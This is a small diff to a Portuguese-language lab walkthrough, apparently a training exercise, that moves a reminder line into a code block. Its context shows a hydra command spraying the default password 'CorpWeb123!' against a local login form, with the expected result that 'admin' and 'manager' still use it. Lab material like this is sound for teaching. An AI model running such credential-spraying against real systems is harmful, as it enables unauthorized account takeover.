@@ -102,8 +102,9 @@ Crie o arquivo `users.txt` com os e-mails/usernames coletados do **Alvo 1** (ex:
 hydra -L users.txt -p CorpWeb123! 127.0.0.1 -s 5001 http-post-form \
 "/check_login:username=^USER^&password=^PASS^:Invalid Credentials"
 ```
-LEMBRE-SE DE ACESSAR A URL CORRETA!
+
 **Resultado Esperado:** O Hydra listará os usuários que ainda utilizam a senha padrão (`admin` e `manager`).
 
 ```
+LEMBRE-SE DE ACESSAR A URL CORRETA!
 ```
